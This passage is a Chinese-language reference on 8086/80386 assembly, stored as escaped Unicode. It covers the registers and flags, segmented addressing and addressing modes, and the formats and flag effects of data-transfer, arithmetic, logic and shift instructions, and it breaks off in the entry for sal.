\u6307\u9488\u5bc4\u5b58\u5668\uff1asp bp\uff0c\u5e38\u4e0e ss \u6784\u6210\u8fdc\u6307\u9488 sp\uff1a\u5806\u6808\u6307\u9488\u5bc4\u5b58\u5668\uff0css:sp \u6307\u5411\u5806\u6808\u9876\u7aef bp\uff1a\u57fa\u5740\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5e38\u7528 ss:bp \u6307\u5411\u5806\u6808\u4e2d\u6570\u636e \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es cs\uff1a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u6bb5\u5730\u5740 ss\uff1a\u5806\u6808\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740 ds\uff1a\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u6570\u636e\u6bb5\u7684\u6bb5\u5730\u5740 es\uff1a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u9644\u52a0\u6570\u636e\u6bb5\u6bb5\u5730\u5740 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aip fl ip\uff1a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u504f\u79fb\u5730\u5740\uff0c cs:ip \u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u9996\u5b57\u8282\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee ip fl\uff1a\u6807\u5fd7\u5bc4\u5b58\u5668\uff0c16 \u4f4d\u4f46\u53ea\u4f7f\u7528 9 \u4f4d\u8868\u793a 6 \u4e2a\u72b6\u6001\u6807\u5fd7\u548c 3 \u4e2a\u63a7\u5236\u6807\u5fd7\uff08df if tf\uff09 of\uff1aoverflow flag \u6ea2\u51fa\u6807\u5fd7\uff0c\u7b2c 11 \u4f4d\uff0c\u8868\u793a\u8fd0\u7b97\u662f\u5426\u6ea2\u51fa df\uff1adirection flag \u65b9\u5411\u6807\u5fd7\uff0c\u7b2c 10 \u4f4d\uff0c\u6807\u5fd7\u5b57\u7b26\u4e32\u5904\u7406\u6307\u4ee4\u4e2d\u5904\u7406\u4fe1\u606f\u7684\u65b9\u5411 if\uff1ainterrupt flag \u4e2d\u65ad\u6807\u5fd7\uff0c\u7b2c 9 \u4f4d\uff0c\u662f\u5426\u5141\u8bb8\u5916\u90e8\u786c\u4ef6\u4e2d\u65ad tf\uff1atrace flag \u8ddf\u8e2a\u6807\u5fd7\uff0c\u7b2c 8 \u4f4d\uff0cCPU \u662f\u5426\u8fdb\u5165\u5355\u6b65\u5de5\u4f5c\u72b6\u6001 sf\uff1asign flag \u7b26\u53f7\u6807\u5fd7\uff0c\u7b2c 7 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u7b26\u53f7\uff081 \u8868\u793a\u8d1f\uff09 zf\uff1azero flag \u96f6\u6807\u5fd7\uff0c\u7b2c 6 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u4e3a 0 af\uff1aauxiliary carry flag \u8f85\u52a9\u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 4 \u4f4d\uff0c\u8bb0\u5f55\u8fd0\u7b97\u65f6\u7b2c\u4e09\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u4ea7\u751f\u8fdb\u501f\u4f4d pf\uff1aparity flag \u5947\u5076\u6807\u5fd7\uff0c\u7b2c 2 \u4f4d\uff0c\u7ed3\u679c\u64cd\u4f5c\u6570\u4e2d\u4f4e 8 \u4f4d 1 \u7684\u4e2a\u6570\u662f\u5426\u4e3a\u5076\u6570 cf\uff1acarry flag \u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 0 \u4f4d\uff0c\u8fd0\u7b97\u65f6\u6700\u9ad8\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u6709\u8fdb\u501f\u4f4d 80386 32 \u4f4d\u5bc4\u5b58\u5668\u4e00\u5171\u6709 16 \u4e2a \u901a\u7528\u5bc4\u5b58\u5668 eax ebx ecx edx\uff0c\u53ef\u4ee5\u4f7f\u7528\u4f8b\u5982 ax \u8868\u793a\u4f4e 16 \u4f4d\uff0cah al \u5206\u522b\u8868\u793a\u4f4e 16 \u4f4d\u4e2d\u7684\u9ad8\u4f4e 8 \u4f4d esi edi\uff0c\u4f4e 16 \u4f4d\u4e3a si di esp ebp\uff0c\u4f4e 16 \u4f4d\u4e3a sp bp \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es fs gs\uff08\u591a\u4e86\u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff09 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aeip eflags 8086 \u5185\u5b58\u7ec4\u7ec7 \u00b6 \u53ef\u8bbf\u95ee\u7684\u5185\u5b58\u4e00\u5171\u6709 1MB\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e3a 00000h~FFFFFh\uff0c\u8fd9\u6837\u7528 20 \u4f4d\u8868\u793a\u7684\u5730\u5740\u79f0\u4e3a\u7269\u7406\u5730\u5740 \u5bfb\u5740\u65f6\u4f7f\u7528\u7684\u662f \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u5f62\u5f0f\u7684\u903b\u8f91\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\u4e3a \u6bb5\u5730\u5740*16+\u504f\u79fb\u5730\u5740\uff0c\u6c47\u7f16\u91cc\u5199\u6210 \u6bb5\u5730\u5740:[\u504f\u79fb\u5730\u5740]\u3002\u540c\u6837\u4e5f\u5bb9\u6613\u770b\u51fa\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u5bf9\u5e94\u7684\u903b\u8f91\u5730\u5740\u8868\u793a\u5e76\u4e0d\u552f\u4e00 \u6307\u4ee4\u7cfb\u7edf\u4e0e\u5bfb\u5740\u65b9\u5f0f \u00b6 \u6c47\u7f16\u6307\u4ee4\u4e00\u822c\u7531\u64cd\u4f5c\u7801\uff08opcode\uff09\u548c\u64cd\u4f5c\u6570\uff08operand\uff09\u6784\u6210\uff0c\u4efb\u4f55\u6307\u4ee4\u90fd\u6709\u64cd\u4f5c\u7801\uff0c\u64cd\u4f5c\u6570\u7684\u4e2a\u6570\u4e0d\u4e00\u5b9a \u64cd\u4f5c\u6570\u5bfb\u5740\u65b9\u5f0f \u00b6 \u7acb\u5373\u6570\u65b9\u5f0f \uff1a\u5373\u64cd\u4f5c\u6570\u4e3a\u5e38\u6570 \u5bc4\u5b58\u5668\u65b9\u5f0f \uff1a\u4ee5\u5bc4\u5b58\u5668\u4e3a\u64cd\u4f5c\u6570 \u76f4\u63a5\u5bfb\u5740 \uff1a\u901a\u8fc7\u903b\u8f91\u5730\u5740\u8868\u793a\u64cd\u4f5c\u6570\uff0c\u4e14\u504f\u79fb\u5730\u5740\u4e3a\u7acb\u5373\u6570\uff0c\u6bd4\u5982 [1234h]\u3001ss:[1234h]\uff0c\u7701\u7565\u60c5\u51b5\u9ed8\u8ba4 ds \u95f4\u63a5\u5bfb\u5740 \uff1a\u903b\u8f91\u5730\u5740\u7684\u504f\u79fb\u5730\u5740\u4ee5\u95f4\u63a5\u5f62\u5f0f\u8868\u793a\uff0c\u65b9\u62ec\u53f7\u5185\u53ea\u80fd\u662f bx bp si di\uff0c\u4e14\u8868\u793a\u4e3a \u57fa\u5740\u5bc4\u5b58\u5668\uff08bx bp \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u53d8\u5740\u5bc4\u5b58\u5668\uff08si di \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u4f4d\u79fb\u91cf\uff08\u7acb\u5373\u6570\u6216\u6ca1\u6709\uff09\u7684\u5f62\u5f0f \u5373 bx bp \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0\uff0csi di \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0 \u7701\u7565\u6bb5\u5730\u5740\u65f6\uff0c\u5982\u679c\u504f\u79fb\u5730\u5740\u5185\u6709 bp \u51fa\u73b0\uff0c\u5219\u7f3a\u7701\u6bb5\u5730\u5740\u4e3a ss\uff0c\u5176\u5b83\u60c5\u51b5\u5747\u4e3a ds \u6bb5\u5730\u5740\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u9664 cs ss ds \u5916\u7684\u5176\u5b83\u6bb5\u5730\u5740\u9884\u5148\u5b58\u5728 es \u4e2d\u518d\u5bfb\u5740 8086 \u6c47\u7f16\u6307\u4ee4 \u00b6 \u5982\u679c\u6307\u4ee4\u4e2d\u6ca1\u6709\u6807\u5fd7\u4f4d\u8868\u683c\uff0c\u5219\u8be5\u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d\u3002\u53f3\u659c\u7ebf\u8868\u793a\u8be5\u6807\u5fd7\u4f4d\u7531\u7ed3\u679c\u51b3\u5b9a\uff0c\u5168\u90e8\u586b\u5145\u4e3a\u6839\u636e\u7279\u6b8a\u610f\u4e49\u8bbe\u5b9a\uff08\u6ce8\u610f\u4e2d\u4f1a\u5177\u4f53\u8bf4\uff09\uff0c\u6253\u53c9\u4e3a undefined\uff08\u4e00\u822c\u4e0d\u53d8\uff09 \u6570\u636e\u4f20\u9001\u6307\u4ee4 \u00b6 \u901a\u7528\u6570\u636e\u4f20\u9001\u6307\u4ee4 \u00b6 mov \u6307\u4ee4\u683c\u5f0f \uff1amov a, b \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 b \u7684\u503c\u4f20\u5165 a \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0cb \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u3001\u903b\u8f91\u5730\u5740\u6216\u7acb\u5373\u6570\uff0c\u4f46 a b \u6700\u591a\u6709\u4e00\u4e2a\u662f\u903b\u8f91\u5730\u5740\uff0c\u4e14\u5982\u679c\u662f\u5c06\u7acb\u5373\u6570\u4f20\u5165\u903b\u8f91\u5730\u5740\u6240\u6307\u5185\u5b58\u65f6\u8981\u6807\u6ce8\u5927\u5c0f\uff08byte ptr / word ptr\uff09\uff0c\u5e76\u4e14 a b \u5bbd\u5ea6\u9700\u4e00\u81f4\u3002\u4e0d\u80fd\u628a\u7acb\u5373\u6570\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\uff0c\u4e5f\u4e0d\u80fd\u628a\u6bb5\u5bc4\u5b58\u5668\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d push \u6307\u4ee4\u683c\u5f0f \uff1apush a \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 a \u538b\u5165\u6808\uff0c\u5373 sp = sp - 2, word ptr ss:[sp] = a \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u5185\u5bb9\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e0d\u80fd\u662f fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d pop \u6307\u4ee4\u683c\u5f0f \uff1apop a \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u6808\u4e0a\u5f39\u51fa 16 \u4f4d\u6570\u503c\u5230 a \u4e2d\uff0c\u5373 a = word ptr ss:[sp], sp = sp + 2 \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f cs fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d xchg \u6307\u4ee4\u683c\u5f0f \uff1axchg op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ea4\u6362 op1 op2\uff0c\u5373 tmp = op1, op1 = op2, op2 = tmp \u6ce8\u610f \uff1aop1 op2 \u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\uff0c\u4e0d\u80fd\u90fd\u662f\u5185\u5b58\uff0c\u4e14\u4e0d\u80fd\u662f\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d \u7aef\u53e3\u8f93\u5165\u8f93\u51fa\u6307\u4ee4 \u00b6 in \u6307\u4ee4\u683c\u5f0f \uff1ain acc, port \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u7aef\u53e3\u8bfb\u6570\u636e\u5230 al \u6216 ax \u4e2d\uff0c\u5373 acc = [port]\uff08\u7aef\u53e3\u4e2d\u5185\u5bb9\uff09 \u6ce8\u610f \uff1aacc \u4e00\u5b9a\u662f al \u6216 ax\uff0cport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u6700\u5927 0FFh\u3002\u662f ax \u5219 [port] \u5b58\u5165 al\uff0c[port+1] \u5b58\u5165 ah out \u6307\u4ee4\u683c\u5f0f \uff1aout port, acc \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a al \u6216 ax \u4e2d\u503c\u5199\u5165\u7aef\u53e3\uff0c\u5373 [port] = acc \u6ce8\u610f \uff1aport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff08\u7acb\u5373\u6570\u6700\u5927 0FFh\uff09\uff0cacc \u4e00\u5b9a\u662f al \u6216 ax\u3002\u662f ax \u5219 al \u5199\u5165 [port]\uff0cah \u5199\u5165 [port+1] \u5730\u5740\u4f20\u9001\u6307\u4ee4 \u00b6 lea \u6307\u4ee4\u683c\u5f0f \uff1alea dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u7684\u6709\u6548\u5730\u5740\u4f20\u5165 dest\uff0c\u5373 dest = offset src \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5185\u5b58\u53d8\u91cf\u3002\u53d6 src \u7684\u504f\u79fb\u5730\u5740 lds \u6307\u4ee4\u683c\u5f0f \uff1alds dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ds:dest\uff0c\u5373 dest = word ptr [src], ds = word ptr [src+2] \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58 les \u6307\u4ee4\u683c\u5f0f \uff1ales dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 es:dest\uff0c\u5373 dest = word ptr [src], es = word ptr [src+2] \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58 \u6807\u5fd7\u5bc4\u5b58\u5668\u4f20\u9001\u6307\u4ee4 \u00b6 lahf \u6307\u4ee4\u683c\u5f0f \uff1alahf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 fl \u4f4e 8 \u4f4d\u590d\u5236\u5230 ah\uff0c\u5373 ah = fl & 0FFh sahf \u6307\u4ee4\u683c\u5f0f \uff1asahf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ah \u5b58\u5165 fl \u4f4e 8 \u4f4d\uff0c\u5373 fl = (fl & 0FF00h) | 2 | (ah & 0D5h) \u6ce8\u610f \uff1a\u53ea\u4fdd\u7559 ah \u7684 0 2 4 6 7 \u4f4d\uff08cf pf af zf sf\uff09\uff0c\u4e14\u7b2c 1 \u4f4d\u6052\u4e3a 1 OF DF IF TF SF ZF AF PF CF pushf \u6307\u4ee4\u683c\u5f0f \uff1apushf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 fl \u538b\u5165\u5806\u6808\uff0c\u5373 push fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\uff09 popf \u6307\u4ee4\u683c\u5f0f \uff1apopf \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u5806\u6808\u5f39\u51fa 16 \u4f4d\u5230 fl\uff0c\u5373 pop fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c OF DF IF TF SF ZF AF PF CF \u8f6c\u6362\u6307\u4ee4 \u00b6 \u7b26\u53f7\u6269\u5145\u6307\u4ee4 \u00b6 cbw \u6307\u4ee4\u683c\u5f0f \uff1acbw \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u5b57\u8282 al \u6269\u5145\u4e3a\u5b57 ax\uff0c\u5373\u5c06 al \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 ah cwd \u6307\u4ee4\u683c\u5f0f \uff1acwd \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u5b57 ax \u6269\u5145\u4e3a\u53cc\u5b57 dx:ax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 ax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 dx xlat \u6307\u4ee4\u683c\u5f0f \uff1axlat \u6307\u4ee4\u4f5c\u7528 \uff1a\u6362\u7801\u6307\u4ee4\uff0cal = byte ptr ds:[bx+al] \u6ce8\u610f \uff1a\u4e00\u822c\u4f7f ds:bx \u6307\u5411\u4e00\u5f20\u8868\uff0c\u7136\u540e\u529f\u80fd\u5373\u7c7b\u4f3c\u5217\u8868\u7d22\u5f15\u53d6\u503c \u7b97\u6570\u6307\u4ee4 \u00b6 \u52a0\u6cd5\u6307\u4ee4 \u00b6 add \u6307\u4ee4\u683c\u5f0f \uff1aadd dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u52a0\u5230 dest \u4e0a\uff0c\u5373 dest += src \u6ce8\u610f \uff1asrc \u53ef\u4ee5\u662f\u7acb\u5373\u6570/\u5bc4\u5b58\u5668/\u5185\u5b58\uff0cdest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668/\u5185\u5b58\uff0c\u4f46\u4e8c\u8005\u4e0d\u80fd\u90fd\u4e3a\u5185\u5b58\uff0c\u5bbd\u5ea6\u8981\u4e00\u81f4\u3002\u53ef\u80fd\u4f1a\u4ea7\u751f\u8fdb\u4f4d\uff08cf\uff09\u548c\u6ea2\u51fa\uff08of\uff09 OF DF IF TF SF ZF AF PF CF inc \u6307\u4ee4\u683c\u5f0f \uff1ainc op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 op \u52a0\u4e00\uff0c\u5373 op += 1 \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d OF DF IF TF SF ZF AF PF CF adc \u6307\u4ee4\u683c\u5f0f \uff1aadc dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u52a0\uff0c\u5373 dest = dest + src + cf \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u89c4\u5219\u4e0e add \u76f8\u540c\uff0c\u53ef\u4ee5\u7528\u4e8e\u6a21\u62df 32 \u4f4d\u52a0\u6cd5 OF DF IF TF SF ZF AF PF CF \u51cf\u6cd5\u6307\u4ee4 \u00b6 sub \u6307\u4ee4\u683c\u5f0f \uff1asub dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece dest \u51cf\u53bb src\uff0c\u5373 dest -= src \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0c\u4f1a\u4ea7\u751f\u6ea2\u51fa\uff08of\uff09\uff0c\u501f\u4f4d\u4e5f\u4f1a\u4f7f cf \u53d8 1 OF DF IF TF SF ZF AF PF CF sbb \u6307\u4ee4\u683c\u5f0f \uff1asbb dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u501f\u4f4d\u51cf\uff0cdest = dest - src - cf \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add OF DF IF TF SF ZF AF PF CF dec \u6307\u4ee4\u683c\u5f0f \uff1adec op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 op \u51cf\u4e00\uff0c\u5373 op -= 1 \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d OF DF IF TF SF ZF AF PF CF neg \u6307\u4ee4\u683c\u5f0f \uff1aneg op \u6307\u4ee4\u4f5c\u7528 \uff1aop = -op \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u975e\u96f6\u6570\u6c42\u8865\u540e cf=1\uff0c0 \u6c42\u8865\u540e cf=0 OF DF IF TF SF ZF AF PF CF cmp \u6307\u4ee4\u683c\u5f0f \uff1acmp op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u7528 op1 \u51cf op2\uff0c\u4f46\u4e22\u5f03\u7ed3\u679c\u53ea\u5f71\u54cd\u6807\u5fd7\u4f4d \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c sub\uff0c\u7528\u4e8e\u5728 jump \u6307\u4ee4\u524d\u7ed9\u51fa\u7b26\u53f7\u4f4d\u4f5c\u4e3a\u6761\u4ef6\u5224\u65ad\u4f9d\u636e\u3002 OF DF IF TF SF ZF AF PF CF \u4e58\u6cd5\u6307\u4ee4 \u00b6 mul \u6307\u4ee4\u683c\u5f0f \uff1amul src \u6307\u4ee4\u4f5c\u7528 \uff1a\u975e\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u5f53 src \u4e3a 8 \u4f4d\u65f6 ax = al * src\uff0c\u5f53 src \u4e3a 16 \u4f4d\u65f6 dx:ax = ax * src \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u5982\u679c\u9ad8\u4f4d\uff08\u4e00\u534a\uff09\u662f 0\uff0c\u5219\u5c06 of cf \u7f6e 0\uff0c\u5426\u5219\u7f6e 1 OF DF IF TF SF ZF AF PF CF imul \u6307\u4ee4\u683c\u5f0f \uff1aimul src \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u4e58\u6cd5\u65b9\u5f0f\u540c mul\uff0c\u4f46\u5c06\u4e24\u4e2a\u4e58\u6570\u548c\u79ef\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570 OF DF IF TF SF ZF AF PF CF \u9664\u6cd5\u6307\u4ee4 \u00b6 div \u6307\u4ee4\u683c\u5f0f \uff1adiv op \u6307\u4ee4\u4f5c\u7528 \uff1a\u65e0\u7b26\u53f7\u6570\u9664\u6cd5 \u5f53 op \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / op, ah = ax % op \u5f53 op \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / op, dx = dx:ax % op \u6ce8\u610f \uff1aop \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u53ef\u4ee5\u5f97\u5230\u5546\u548c\u4f59\u6570 OF DF IF TF SF ZF AF PF CF idiv \u6307\u4ee4\u683c\u5f0f \uff1aidiv \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b26\u53f7\u6570\u9664\u6cd5\uff0c\u9664\u6cd5\u64cd\u4f5c\u540c div\uff0c\u4f46\u5c06\u9664\u6570\u3001\u88ab\u9664\u6570\u3001\u5546\u548c\u4f59\u6570\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570 OF DF IF TF SF ZF AF PF CF \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4 \u00b6 and \u6307\u4ee4\u683c\u5f0f \uff1aand dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u4e0e\u8fd0\u7b97\uff0cdest = dest & src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF or \u6307\u4ee4\u683c\u5f0f \uff1aor dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u6216\u8fd0\u7b97\uff0cdest = dest | src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF xor \u6307\u4ee4\u683c\u5f0f \uff1axor dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u5f02\u6216\u8fd0\u7b97\uff0cdest = dest ^ src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF not \u6307\u4ee4\u683c\u5f0f \uff1anot op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 op \u6309\u4f4d\u6c42\u53cd\uff0cop = ~op \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58 test \u6307\u4ee4\u683c\u5f0f \uff1atest op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4d\u6d4b\u8bd5\uff0cop1 & op2 \u4e22\u5f03\u7ed3\u679c\u4ec5\u5f71\u54cd\u7b26\u53f7\u4f4d \u6ce8\u610f \uff1a\u4e3b\u8981\u7528\u5230 zf \u7684\u53d8\u5316\uff0c\u4e3a jz jnz \u63d0\u4f9b zf OF DF IF TF SF ZF AF PF CF \u79fb\u4f4d\u6307\u4ee4 \u00b6 shl \u6307\u4ee4\u683c\u5f0f \uff1ashl dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u903b\u8f91\u5de6\u79fb count \u4f4d\uff0c\u53f3\u4fa7\u8865 0\uff0c\u5de6\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF shr \u6307\u4ee4\u683c\u5f0f \uff1ashr dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u903b\u8f91\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF sal \u6307\u4ee4\u683c\u5f0f \uff1asal dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u7b97\u6570\u5de6\u79fb count \u4f4d\uff0c\u540c\u903b\u8f91\u5de6\u79fb \u6ce8\u610f \uff1a\u4e0e shl \u5b8c\u5168\u76f8\u540c \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 